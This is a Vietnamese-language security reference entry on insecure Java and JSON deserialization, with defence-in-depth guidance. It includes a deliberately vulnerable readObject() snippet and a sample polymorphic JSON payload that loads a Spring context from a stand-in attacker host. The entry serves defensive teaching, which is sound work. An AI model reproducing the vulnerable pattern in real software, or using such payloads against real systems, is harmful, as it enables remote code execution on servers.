---
tier: 1
id: insecure-deserialization
title: Insecure Deserialization
cwe: [CWE-502]
owasp: [A08:2021]
tags: [example, deserialization, cwe-502, a08, java, rce, software-and-data-integrity-failures]
references:
  - https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
  - https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
  - https://cwe.mitre.org/data/definitions/502.html
---

# Insecure Deserialization

## 1. Khái niệm & Mối đe dọa (Overview & Threat Impact)

Insecure Deserialization (Giải tuần tự hóa không an toàn) là lỗ hổng thuộc nhóm Software and Data Integrity Failures (CWE-502 / OWASP A08:2021) xảy ra khi ứng dụng chuyển đổi luồng dữ liệu nhị phân hoặc chuỗi tuần tự hóa từ nguồn không tin cậy thành đối tượng trong bộ nhớ (Object Deserialization) mà không kiểm soát loại đối tượng (class type) được khởi tạo.

Kẻ tấn công có thể cấu tạo payload chứa chuỗi đối tượng lồng nhau (Gadget Chains) lợi dụng các lớp class có sẵn trong classpath của ứng dụng (như Apache Commons Collections, Spring Framework, Groovy) để kích hoạt thực thi mã tự động khi hàm `readObject()` hoặc getter/setter được gọi.

Hậu quả của Insecure Deserialization:
- **Thực thi mã từ xa (Remote Code Execution - RCE):** Chiếm toàn quyền kiểm soát máy chủ ứng dụng.
- **Từ chối dịch vụ (Denial of Service - DoS):** Gây cạn kiệt bộ nhớ hoặc treo CPU thông qua các cấu trúc dữ liệu đệ quy/vòng lặp vô tận.
- **Thao túng dữ liệu & Leo thang đặc quyền:** Thay đổi trạng thái nội bộ của đối tượng (ví dụ: cờ `isAdmin=true`) mà không cần trải qua logic xác thực nghiệp vụ.

## 2. Các biến thể phổ biến (Common Attack Variants)

### 2.1. Java Native Deserialization (`ObjectInputStream.readObject()`)

Đây là biến thể phổ biến nhất trong hệ sinh thái Java khi ứng dụng đọc luồng byte từ request HTTP, cookie hoặc socket mạng qua `ObjectInputStream`:

```java
// LỖ HỔNG: Giải tuần tự hóa trực tiếp dữ liệu do người dùng kiểm soát
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();
```

OpenGrep rule `java-unsafe-deserialization` gắn CWE-502 / OWASP A08 bắt pattern này. Nếu trong ứng dụng có chứa các thư viện có gadget chain đã biết (như `ysoserial`), `readObject()` trên dữ liệu attacker-controlled có thể dẫn tới RCE ngay lập tức trong quá trình tạo đối tượng.

### 2.2. JSON / XML Polymorphic Deserialization

Nhiều thư viện JSON/XML (như Jackson với `@JsonTypeInfo` / `enableDefaultTyping()`, Fastjson, hoặc XStream) cho phép định nghĩa tên class đầy đủ ngay trong chuỗi JSON/XML (ví dụ: `["org.springframework.context.support.ClassPathXmlApplicationContext", "http://evil.com/spel.xml"]`). Khi phân tích cú pháp, thư viện sẽ tự động nạp và khởi tạo lớp class được chỉ định.

### 2.3. Python Pickle & PHP Unserialize

Tương tự Java, việc gọi `pickle.loads()` trong Python hoặc `unserialize()` trong PHP trên dữ liệu không tin cậy sẽ cho phép thực thi mã tùy ý thông qua phương thức `__reduce__()` hoặc `__wakeup()`.

## 3. Nguyên tắc phòng thủ đa lớp (Defense-in-Depth Strategy)

Chiến lược phòng chống Insecure Deserialization triệt để:

1. **Lớp 1 — Tránh tuyệt đối định dạng tuần tự hóa nhị phân nguyên bản (Avoid Native Serialization):**
   Thay thế Java Native Serialization bằng các định dạng trao đổi dữ liệu an toàn, phi thực thi (như JSON, Protocol Buffers, FlatBuffers) với cấu trúc schema xác thực chặt chẽ.
2. **Lớp 2 — Bộ lọc giải tuần tự hóa theo danh sách trắng (Look-Ahead ObjectInputFilter):**
   Nếu bắt buộc phải sử dụng Java Serialization, triển khai `ObjectInputFilter` (tích hợp từ Java 9+) với danh sách trắng nghiêm ngặt (chỉ cho phép các class an toàn thuộc gói nghiệp vụ của ứng dụng, từ chối toàn bộ class khác trước khi giải tuần tự hóa).
3. **Lớp 3 — Quản lý và cách ly thư viện phụ thuộc (Dependency Management):**
   Liên tục rà soát và cập nhật các thư viện phụ thuộc để loại bỏ các gói chứa gadget chain đã biết.
4. **Lớp 4 — Ký số và mã hóa dữ liệu tuần tự hóa (Cryptographic Integrity Verification):**
   Nếu dữ liệu tuần tự hóa bắt buộc phải lưu ở client (như session cookie), bắt buộc phải ký số (HMAC) hoặc mã hóa (AES-GCM) ở server và xác thực chữ ký trước khi giải mã.

## 4. Tài liệu tham khảo thẩm quyền (Authoritative References)

- [OWASP Top 10:2021 — A08: Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
